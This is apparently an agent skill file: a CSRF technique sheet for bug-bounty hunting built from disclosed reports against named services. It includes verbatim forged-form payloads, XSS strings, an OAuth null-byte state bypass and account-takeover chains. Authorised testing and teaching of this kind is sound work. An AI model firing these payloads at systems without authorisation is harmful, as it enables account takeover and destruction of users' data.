---
name: hunter-l3-csrf
description: "Use when hunting CSRF on a target. Loads the L3 technique sheet: Cross-Site Request Forgery is the classic \"authenticated victim, attacker-crafted request\" bug: a state-changing endpoint trusts the ambient session cookie instead of verifying an anti-CSRF token or Origin."
domain: cybersecurity
subdomain: web
tags:
- web
- csrf
- hunting
- l3
version: '1.0'
---

# CSRF — Technique Sheet

## Overview

Cross-Site Request Forgery is the classic "authenticated victim, attacker-crafted request" bug: a state-changing endpoint trusts the ambient session cookie instead of verifying an anti-CSRF token or Origin. It pays when the forged action is meaningful on the victim's account — email/password changes (which escalate to full account takeover), OAuth account linking, token leakage, or destructive settings changes. Many of the highest-paying findings here were NOT the CSRF itself but the escalation one step later (password reset on the changed email, OAuth login CSRF, CSRF→XSS).

## Distinct sub-patterns

### 1. Plain missing token on authenticated POST (account settings / password)

- **Endpoint shape:** `POST /accounts/profile`, `POST /get-started/complete`, `POST /customer/account/resetpasswordpost/`, `POST /AutoChoice/changeQAOktaAnswer`, `POST /AutoChoice/changePwOktaAnswer`
- **Payload:** Standard auto-submitting hidden form, e.g. (OpenMage, id=1086752):
  ```html
  <form action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
    <input type="hidden" name="password" value="password123" />
    <input type="hidden" name="confirmation" value="password123" />
  </form>
  <script>document.forms[0].submit()</script>
  ```
  For X/Niche (id=100849): `<input type="hidden" name="_method" value="patch"/><input type="hidden" name="authenticity_token" value=""/><input type="hidden" name="user[email]" value="hacker1@gmail.com"/>` — note the empty token and Rails `_method=patch` override.
- **Root cause:** Server-side CSRF validation missing or the token field is present but not actually validated server-side (`authenticity_token` with empty value accepted).
- **Impact:** Email change → password reset → full account takeover (id=100849 X/Niche; id=1018270 DoD; id=1066083 DoD). GSA (id=1208453): two chained CSRFs — first update the security question answer, then use it to set a new password → ATO. Ubiquiti (id=101909): direct password change to attacker's value.
- **Exemplars:** id=100849, id=1208453

### 2. Token present in form but not validated (or stale/leaked token)

- **Endpoint shape:** Weblate `POST /accounts/profile` with `csrfmiddlewaretoken` (empty works); IntenseDebate `POST /edit-user-account` with `_idnonce`; ownCloud login CSRF token.
- **Payload:** IntenseDebate (id=1090982): `<input type="text" value="xyz123" name="_idnonce"><input type="text" value="attacker@email.com" name="txt_email">` — a stale `_idnonce` recorded before the account changed hands was still accepted.
- **Root cause:** Token field is not checked server-side, or token lifecycle is broken: not rotated after login (ownCloud id=111216 — token persists across sessions on a shared workstation), not rotated on email/ownership change (IntenseDebate), or token printed in HTML for every action without per-action binding (HackerOne id=103787 — token extractable via any SOP bypass, e.g. framing CloudFlare's `/cdn-cgi/trace` + UXSS).
- **Impact:** ATO via email change (id=1090982); CSRF against the *next* user's session (id=111216); arbitrary CSRF once token is extracted (id=103787).
- **Exemplars:** id=1090982, id=111216

### 3. State-changing GET endpoints

- **Endpoint shape:**
  - `GET /emails/remove-userimage/{num}` (Gravatar, id=101145)
  - `GET /accounts/{num}/set_as_primary` (Coinbase, id=10563, id=10829)
  - `GET /auth/twitter/disconnect` (Shopify, id=111216)
  - `GET /php/disconnect_twitter_profile.php` (Zomato, id=114127)
  - `GET https://themes.shopify.com/themes/editions/styles/light/demo` (id=103351 — GET bypasses the CSRF-protected POST install)
- **Payload:** Simplest possible: `<img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect">` (id=111216). Coinbase: `https://coinbase.com/accounts/535e52d301c95bda2100005b/set_as_primary` — works with just the session cookie, even in an iframe.
- **Root cause:** Destructive action implemented as GET with no token; contrast noted in id=10829: the delete-account function HAS a token, set_as_primary does not. Shopify themes demo (id=103351): the GET route performs the install without validating `authenticity_token` at all.
- **Impact:** Deleted Gravatar images, changed Coinbase primary account, disconnected social accounts, installed a premium theme into the victim's store.
- **Exemplars:** id=10563, id=111216

### 4. OAuth CSRF — login CSRF / account linking

- **Endpoint shape:** `GET /auth/pinterest/callback?code=...` (Shopify, id=104931, id=111218); `GET /auth?code=...&scope=user_read&state=...` (Streamlabs, id=1046630); careers SSO login/callback (TikTok, id=1010522).
- **Payload:** Streamlabs (id=1046630) — the verbatim state bypass: `state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00` — a null byte appended to the attacker's valid state defeats the equality check. Pinterest (id=104931): `https://pinterest-commerce.shopifyapps.com/auth/pinterest/callback?code=d0c18854a3359866774d479614081453d235962f` (code captured by intercepting and dropping the attacker's own callback).
- **Root cause:** No `state` parameter at all (Pinterest), or partial/weak state validation (Streamlabs null-byte bypass). Chain technique: attacker runs the OAuth flow themselves in Burp, generates the CSRF PoC from the callback, and drops the request so the one-time code stays unconsumed for the victim to fire.
- **Impact:** Attacker's Pinterest/Twitch/gmail account bound to the victim's store/account → attacker logs in as the victim (Streamlabs = ATO via attacker's own Twitch creds; Bumble/badoo id=127703 = ATO; TikTok careers = ATO via SSO CSRF + open redirect).
- **Exemplars:** id=1046630, id=104931

### 5. Badoo-style token leak via public file (id=127703)

- **Endpoint shape:** `GET /google/verify.phtml?rt=<token>&code=...` protected only by the `rt` CSRF token, which is exposed in a publicly readable service-worker: `https://eu1.badoo.com/worker-scope/chrome-service-worker.js` (payload verbatim: `var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';`).
- **Root cause:** Single-token protection where the token is retrievable pre-auth from a static JS file.
- **Impact:** Linked attacker's gmail to victim's badoo account → login as victim, full ATO.
- **Exemplars:** id=127703

### 6. Token leakage via misconfiguration (Vimeo, id=136481)

- **Endpoint shape:** `POST /settings/videos`, `POST /settings` guarded by an XSRF token that is (a) exposed in 404 pages and (b) readable cross-site through the moogaloop `crossdomain.xml` flash file.
- **Root cause:** Token disclosure via error pages + permissive crossdomain.xml (cross-site flashing).
- **Impact:** Set all of the victim's videos to public and changed their name with no interaction; also leaked name, user id, account type.
- **Exemplars:** id=136481

### 7. GraphQL CSRF via GET (GitLab, id=1122408)

- **Endpoint shape:** `GET /api/graphql?query=...&variables=...`
- **Payload (verbatim):** `mutation CreateSnippet($input: CreateSnippetInput!) { createSnippet(input: $input) { errors snippet { webUrl __typename } needsCaptchaResponse captchaSiteKey __typename } }`
- **Root cause:** The endpoint enforces the CSRF token on POST but accepts state-changing mutations via GET, which a cross-site auto-submitting form can fire.
- **Impact:** Created a public snippet on the logged-in user's account, bypassing the POST-side CSRF protection.
- **Exemplars:** id=1122408

### 8. Missing token + missing SameSite = broad form-data CSRF (UPchieve, id=1309435)

- **Endpoint shape:** Many authenticated POSTs — `/api/calendar/save`, `/api/training/score`, `/auth/reset/send`, `/api/user/volunteer-approval/background-information`, `/api/user/volunteer-approval/reference`, `PUT /api/user` — all accepting `application/x-www-form-urlencoded`.
- **Payload:** `<form action="https://hackers.upchieve.org/api/calendar/save" method="POST"><input type="hidden" name="availability[Sunday][12a]" value="true"/><input type="hidden" name="tz" value="Asia/Singapore"/></form>`
- **Root cause:** No CSRF token AND session cookie without a SameSite attribute → classic auto-submit form works everywhere.
- **Impact:** Calendar modified (verified "Schedule saved"), quizzes submitted, password-reset emails sent, reference/background checks filed on the victim's behalf.
- **Exemplars:** id=1309435

### 9. CSRF → XSS chains (reflected input + missing token)

- **Endpoint shape:** DoD `POST /████` with `frm_email`; DoD `POST /{redacted}` with `building, classroom, course`; MTN `POST /index.cfm?GO=DEALS` with `CFID`; Zomato `POST /contact` with `name, email` (even though a `csrf_token` field exists).
- **Payloads (verbatim):**
  - `nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;` (id=1147949)
  - `"><img src=x onerror=prompt``>;<video>` (id=1118506/1118501)
  - `fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e"><img src=x onerror=alert(document.domain)>` (id=1183241)
- **Root cause:** The state-changing POST lacks CSRF protection AND reflects form fields without output encoding — the forged cross-site request plants and executes XSS in the victim's origin. Zomato contact form (id=115248) had a `csrf_token` field but it was not effectively enforced; XSS popped `alert(document.cookie)` logged in and out.
- **Impact:** Stored/reflected XSS executed in victim sessions → session-token theft (cookies/localStorage) and account impersonation.
- **Exemplars:** id=1147949, id=115248

### 10. CSRF enabling stored HTML/XSS injection

- **Endpoint shape:** DoD case-studies search `POST /` with `keyword`; Concrete CMS `POST /index.php/ccm/calendar/dialogs/event/add/save` (admin context); Concrete ProBlog `POST /tools/addBlog` with `postID, parentID, blogBody`; Uber `POST /wp-admin/admin-ajax.php?action=frs_save` with `post_id, title, content`.
- **Payload:** DoD (id=1014593): `<a href=https://naglinagli.github.io>Click here to win 1000$!</a>` POSTed as `keyword` — persisted across refreshes. Uber (id=125594): form to `admin-ajax.php?action=frs_save` setting `title`/`content` to arbitrary HTML `<script>alert('hello');</script>` on any post ID (logged-in users only; logged-out get `0`).
- **Root cause:** Missing CSRF token on an endpoint that stores or reflects attacker-controlled markup; ProBlog additionally didn't validate that `parentID` actually referenced a blog, so a page could be created anywhere on the site map.
- **Impact:** Persistent injected links on DoD pages; calendar events created on behalf of a logged-in admin; WordPress pages overwritten with arbitrary JS → plugin/theme editor → server-side compromise (id=125594, confirmed high-severity).
- **Exemplars:** id=125594, id=1014593

### 11. CSRF token smuggled through an application parameter (ok.ru, id=102376)

- **Endpoint shape:** `GET http://m.ok.ru/dk?st.cmd=friendReshareTopic&st.topicId=...&st.rtu=<URL-encoded continuation route>`
- **Payload (verbatim, truncated):** `http://m.ok.ru/dk?st.cmd=friendReshareTopic&st.topicId=64607766975788&st.rtu=%2Fdk%3Fbk%3DActionBus%26st.cmd%3DactionBus%26st.rtu%3D%252Fdk%253Fst.cmd%253DuserPhoto%2526st.phoId%253D812501293868%2526st.layer%253Dsoon%2526_prevCmd%253DuserPhoto%2526tkn%253D2696...`
- **Root cause:** The `st.rtu` continuation parameter can itself carry a `tkn` (CSRF token) and a follow-on action (`photos.delete`); the app trusts the embedded route, so the crafted link chains the repost flow into an authenticated delete.
- **Impact:** Victim opens the crafted repost link, clicks "cancel" on the repost dialog, and their photo is deleted — user interaction only on an innocuous-looking action.
- **Exemplars:** id=102376

### 12. Non-Chrome / SameSite gaps and cookie-path quirks

- **Endpoint shape:** Starbucks webapp/login (id=1113559): CSRF-vulnerable endpoint whose only mitigation is SameSite, which is default-on only in Chrome; access token leaked to the CSRF response.
- **Root cause:** Relying on SameSite as the sole CSRF defense; other browsers (Safari/Firefox at the time) leak.
- **Impact:** Access token leaked from a non-Chrome victim; attacker added a Starbucks card; potential ATO at login.starbucks.co.jp.
- Related pure-cookie finding (Gratipay id=123900): `csrf_token` cookie issued without `HttpOnly` — reported as informative, no exploit demonstrated, bountyless.
- **Exemplars:** id=1113559

### 13. Login CSRF / forced signup / forced actions

- **Endpoint shape:** Factlink `POST /users/sign_in_or_up/up` (accepts a *static* `authenticity_token`); TikTok QR login `GET /login?qr=...`; XVIDEOS `POST /account/friends/requests` (cancel/delete friend request); Evernote `POST /secure/CloseAccount.action?accountAction=deactivateAccount&json=true`; Akismet `POST /api/account/{num}/cancel`, `/api/subscription/{num}/cancel` (note: the `userid` in the URL is ignored — any number works); Sifchain newsletter `POST /` with MailChimp `_mc4wp_*` fields (honeypot left empty works).
- **Payload:** Evernote (id=1121990) verbatim body: `password=&oneTimeCode=&captchaResponse=&reasons%5Banalytic%5D=specify-reason-different-app&reasons%5Bi18nKey%5D=CloseAccountAction.accountActionSurvey.differentApp&reasons%5Bchecked%5D=true&otherReason=` — empty password/OTP/captcha accepted.
- **Root cause:** Sign-up/login flows accept cross-site submissions; destructive actions (deactivation, cancels, friend-request deletion) have no token.
- **Impact:** Victim forced into attacker's account (TikTok QR — program confirmed), forced signup (Factlink), premium Evernote accounts deactivated (video PoC), subscriptions cancelled, SMS invites triggered to arbitrary phone numbers (Zomato id=113865).
- **Exemplars:** id=1121990, id=1133661

### 14. CSRF on WordPress/plugin AJAX and admin surfaces

- **Endpoint shape:** `POST /wp-admin/admin-ajax.php?action=frs_save` (see sub-pattern 10) — the recurring lesson: plugin AJAX handlers frequently skip nonces.
- **Impact ladder:** post overwrite → arbitrary JS on site → server compromise via editor. Check every `admin-ajax.php?action=` handler you encounter on scope.

### 15. Deeplink / iframe-triggered "silent" state changes (Snapchat, id=1085336)

- **Endpoint shape:** `GET https://www.snapchat.com/unlock/?type=SNAPCODE_NO_PROMPT&uuid=<lens uuid>&metadata=01` (also reachable via `snapchat://` deeplink).
- **Root cause:** The `SNAPCODE_NO_PROMPT` type skips the confirmation prompt, so opening the link or loading it in an iframe silently installs the lens.
- **Impact:** Lens installed on the victim's account with zero interaction — forced-action CSRF variant.
- **Exemplars:** id=1085336

### 16. Related: response-splitting / reflected-parameter abuse adjacent to CSRF (Shopify, id=114430)

- **Endpoint shape:** `GET https://www.shopify.com/plus?insp_pingurln=https://example.com/%23`
- **Root cause:** The `insp_pingurln` parameter is reflected into a beaconing POST target without validation.
- **Impact:** Visiting the URL causes the victim's browser to POST analytics data (URL, UA, referrer, screen info) to the attacker's URL.
- **Exemplars:** id=114430

## Bypass / chain notes

- **Null-byte state bypass:** `state=<valid>-merge%00` defeated Streamlabs' partial state check (id=1046630). Always try `%00` and truncation suffixes against state comparators.
- **Token lifecycle attacks:** capture a token before login (shared workstation, id=111216) or before account ownership change (id=1090982) — rotation failures turn "token required" into "token optional".
- **SOP-bypass → token extraction:** frame a CloudFlare fronted domain's `/cdn-cgi/trace` (no X-Frame-Options), run a UXSS, read the CSRF token from any same-site page (HackerOne id=103787).
- **GET-over-POST bypass:** if a route has both a CSRF-protected POST and an unprotected GET performing the same action (Shopify theme install id=103351, GitLab GraphQL id=1122408), use the GET.
- **Drop-the-code OAuth chain:** run the OAuth flow yourself in Burp, capture the callback URL, drop the request so the one-time code isn't consumed, then deliver the callback as a link/CSRF to the victim (id=1046630, id=104931).
- **Two-request ATO chains:** (1) CSRF email change → (2) forgot-password (id=100849, id=1018270); or (1) CSRF security-question change → (2) CSRF password change (id=1208453).
- **CSRF→XSS:** any endpoint that both lacks a token and reflects params unencoded is a two-for-one (id=1147949, id=115248, id=1183241, id=1118501).
- **Burp Pro CSRF PoC generator** was used in several reports (id=1090838, id=115248) — fine starting point, but hand-tune for auto-submit (`document.forms[0].submit()`) and `history.pushState` cleanup.

## Gotchas / what NOT to do

- A token field in the form does not mean the token is validated — submit it empty or stale and see (id=100849, id=1090982, id=115248).
- Don't report a missing `HttpOnly` on a csrf_token cookie without an exploit — it was marked informative, no bounty (id=123900).
- Don't assume SameSite saves the site — it's only default in Chrome; test in Safari/Firefox (id=1113559). Conversely, if cookies DO have SameSite=Lax, form-POST CSRF fails; GET-top-level-navigation GETs may still fire.
- Logout CSRF alone is low severity (id=1003468, id=1091403) — treat as supporting evidence, not a standalone bounty.
- Programs sometimes confirm impact without disclosing endpoint details (TikTok id=1087436, id=125594) — the technique class is confirmed even when the record is redacted; don't assume the report was rejected.
- If the endpoint only responds to authenticated users with something like WordPress's `0`, your CSRF only works against logged-in victims — scope impact accordingly (id=125594).

## Real-world impact examples

- **Full ATO via email-change CSRF:** X/Niche (id=100849), DoD (id=1018270, id=1066083), IntenseDebate (id=1090982) — all ended with attacker resetting the password on the email they just set.
- **Full ATO via OAuth login CSRF:** Streamlabs null-byte state bypass → attacker logs in with their own Twitch credentials (id=1046630); Badoo leaked `rt` token → gmail linked → ATO (id=127703); TikTok careers SSO + open redirect (id=1010522); TikTok `*.tiktokv.com` CSRF confirmed as ATO-capable (id=125594/1253462).
- **Two-request password ATO:** GSA Okta security-question + password change (id=1208453).
- **Server-side compromise:** Uber WordPress `frs_save` CSRF → overwrite any post with JS → plugin/theme editor → server compromise (id=125594).
- **Financial/account state damage:** Evernote premium accounts deactivated (id=1121990); Akismet subscriptions cancelled (id=131108); Coinbase primary wallet switched (id=10563); TikTok ads campaign could be disabled (id=1087436, $147 bounty on id=1006306).
- **Silent action injection:** Gravatar image deletion via bare link (id=101145); Snapchat lens installed with no prompt (id=1085336); ok.ru photo deletion via repost-cancel click (id=102376); forced newsletter subscription with 200 "successful" (id=1190705); mass account-creation / activation-email spam DoS on DoD (id=1090838).
- **Token/credential leakage:** Starbucks access token leaked cross-browser (id=1113559); Vimeo videos forced public + name changed via crossdomain.xml token leak (id=136481); Shopify analytics beacon exfiltration (id=114430).